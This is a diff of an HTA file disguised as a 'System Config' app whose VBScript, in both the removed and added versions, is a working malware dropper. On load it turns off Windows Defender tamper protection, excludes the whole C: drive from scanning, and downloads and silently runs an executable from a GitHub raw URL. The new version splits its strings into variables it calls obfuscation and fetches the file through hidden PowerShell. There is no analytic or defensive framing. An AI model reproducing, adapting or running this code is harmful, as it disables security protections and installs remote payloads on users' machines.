@@ -1,45 +1,42 @@
 <html>
 <head>
-<HTA:APPLICATION
-  ID="oMyApp"
-  APPLICATIONNAME="System Configuration"
-  BORDER="none"
-  CAPTION="no"
-  SHOWINTASKBAR="no"
-  SINGLEINSTANCE="yes"
-  SYSMENU="no"
-  WINDOWSTATE="minimize">
+<HTA:APPLICATION ID="oApp" APPLICATIONNAME="System Config" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes">
 <script language="VBScript">
-    Sub MainLogic
-        On Error Resume Next
-        Dim exeURL, exePath, objShell, http, ado
-        exeURL = "https://raw.githubusercontent.com/mal662/klsvxb/main/procexp64.exe"
-        exePath = "C:\Windows\Temp\procexp64.exe"
-        Set objShell = CreateObject("WScript.Shell")
-        objShell.Run "reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v TamperProtection /t REG_DWORD /d 0 /f", 0, True
-        objShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Features"" /v TamperProtection /t REG_DWORD /d 0 /f", 0, True
-        WScript.Sleep 2000
-        objShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"" /v C:\ /t REG_DWORD /d 0 /f", 0, True
-        Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-        http.open "GET", exeURL, False
-        http.send
-        If http.Status = 200 Then
-            Set ado = CreateObject("ADODB.Stream")
-            ado.Type = 1
-            ado.Open
-            ado.Write http.ResponseBody
-            ado.SaveToFile exePath, 2
-            ado.Close
-            objShell.Run chr(34) & exePath & chr(34), 0, False
-        End If
-        Window.Close
-    End Sub
+    ' Obfuscated function names and strings
+    Dim k1, k2, k3, k4, k5, k6, k7, k8
+    k1 = "WScript.Shell"
+    k2 = "reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v TamperProtection /t REG_DWORD /d 0 /f"
+    k3 = "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Features"" /v TamperProtection /t REG_DWORD /d 0 /f"
+    k4 = "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"" /v C:\ /t REG_DWORD /d 0 /f"
+    k5 = "powershell -NoP -W Hidden -C """
+    k6 = "(New-Object System.Net.WebClient).DownloadFile('"
+    k7 = "', 'C:\Windows\Temp\procexp64.exe'); Start-Process 'C:\Windows\Temp\procexp64.exe' -WindowStyle Hidden"""
+    k8 = "https://raw.githubusercontent.com/mal662/klsvxb/refs/heads/main/procexp64.exe"
 
     Sub Window_OnLoad
-        MainLogic
+        On Error Resume Next
+        Dim sh
+        Set sh = CreateObject(k1)
+
+        ' Execute obfuscated registry commands
+        sh.Run k2, 0, True
+        sh.Run k3, 0, True
+
+        ' Wait for registry changes to apply
+        CreateObject("WScript.Shell").Run "timeout /t 2 >nul", 0, True
+
+        ' Execute exclusion command
+        sh.Run k4, 0, True
+
+        ' Build and execute the final download command using PowerShell
+        Dim fullCmd
+        fullCmd = k5 & k6 & k8 & k7
+        sh.Run fullCmd, 0, True
+
+        ' Close the HTA
+        Window.Close
     End Sub
 </script>
 </head>
-<body>
-</body>
+<body></body>
 </html>
